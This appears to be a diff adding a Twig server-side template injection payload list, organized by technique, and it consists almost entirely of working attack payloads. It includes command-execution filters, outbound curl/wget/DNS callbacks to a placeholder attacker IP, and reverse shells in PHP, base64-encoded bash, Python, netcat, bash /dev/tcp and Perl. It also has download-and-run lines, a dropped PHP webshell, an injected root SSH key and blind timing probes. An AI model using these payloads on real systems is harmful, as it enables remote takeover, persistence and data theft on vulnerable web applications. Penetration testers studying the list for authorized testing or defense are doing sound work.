@@ -1,0 +1,118 @@
+Command Execution Tests
+
+# Basic command execution
+{{['id']|filter('system')}}
+{{['id']|map('system')|join}}
+{{['id']|reduce('system')|join}}
+{{['id']|map('passthru')|join}}
+{{['id']|map('exec')|join}}
+{{['id']|map('shell_exec')|join}}
+
+# Using registerUndefinedFilterCallback
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+# Using sort filter
+{{['id']|sort('system')}}
+
+# Using array_map
+{{['id']|map('system')}}
+
+# Using variable functions
+{% set cmd = 'id' %}
+{{[cmd]|filter('system')}}
+
+Outbound Connectivity Tests
+Set up python or nc listener
+
+# HTTP callback
+{{['curl http://YOUR_IP:8000/test']|filter('system')}}
+{{['wget http://YOUR_IP:8000/test -O /dev/null']|filter('system')}}
+{{['ping -c 1 YOUR_IP']|filter('system')}}
+
+# DNS callback
+{{['nslookup YOUR_IP']|filter('system')}}
+{{['dig @YOUR_IP test.domain.com']|filter('system')}}
+
+
+Reverse Shells
+
+PHP Reverse Shells
+
+# PHP reverse shell (direct)
+{{['php -r "$sock=fsockopen(\\"YOUR_IP\\",PORT);exec(\\"/bin/sh -i <&3 >&3 2>&3\\");"']|filter('system')}}
+
+# PHP reverse shell with proc_open
+{{['php -r "\$sock=fsockopen(\\"YOUR_IP\\",PORT);\$proc=proc_open(\\"/bin/sh -i\\", array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);"']|filter('system')}}
+
+# PHP reverse shell with pfsockopen
+{{['php -r "\$sock=pfsockopen(\\"YOUR_IP\\",PORT);exec(\\"/bin/sh -i <&3 >&3 2>&3\\");"']|filter('system')}}
+
+
+Base64 Encoded Reverse Shells
+
+# Base64 payload
+{{['echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==" | base64 -d | bash']|filter('system')}}
+
+# Base64 with sh
+{{['echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==" | base64 -d | sh']|filter('system')}}
+
+
+Fetch and Execute
+
+# Download and run script
+{{['curl http://YOUR_IP:8000/shell.sh | bash']|filter('system')}}
+{{['wget http://YOUR_IP:8000/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh']|filter('system')}}
+
+# Download binary and execute
+{{['curl http://YOUR_IP:8000/nc -o /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/sh YOUR_IP PORT']|filter('system')}}
+
+
+Python Reverse Shell (if Python installed)
+
+# Python3 reverse shell
+{{['python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"YOUR_IP\\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\\"/bin/bash\\",\\"-i\\"])"']|filter('system')}}
+
+# Python2 reverse shell
+{{['python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"YOUR_IP\\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])"']|filter('system')}}
+
+Netcat Reverse Shells
+
+# Netcat with -e
+{{['nc -e /bin/sh YOUR_IP PORT']|filter('system')}}
+
+# Netcat without -e
+{{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP PORT >/tmp/f']|filter('system')}}
+
+
+Bash Reverse Shells
+
+# Bash with /dev/tcp
+{{['bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1']|filter('system')}}
+
+
+Perl Reverse Shell
+
+# Perl reverse shell
+{{['perl -e "use Socket;\$i=\\"YOUR_IP\\";\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");}"']|filter('system')}}
+
+
+File Write Payloads
+
+# Write PHP webshell
+{{['echo "<?php system(\$_GET[\\'cmd\\']); ?>" > /var/www/html/shell.php']|filter('system')}}
+
+# Write SSH key
+{{['echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." > /root/.ssh/authorized_keys']|filter('system')}}
+
+# Write file using Twig
+{{file_put_contents('/tmp/shell.sh', 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1')}}
+
+
+Blind/Time-Based Payloads
+
+# Time-based test
+{{['sleep 5']|filter('system')}}
+
+# Conditional time-based (Twig)
+{% if ['id']|filter('system') == 'root' %}{{['sleep 5']|filter('system')}}{% endif %}
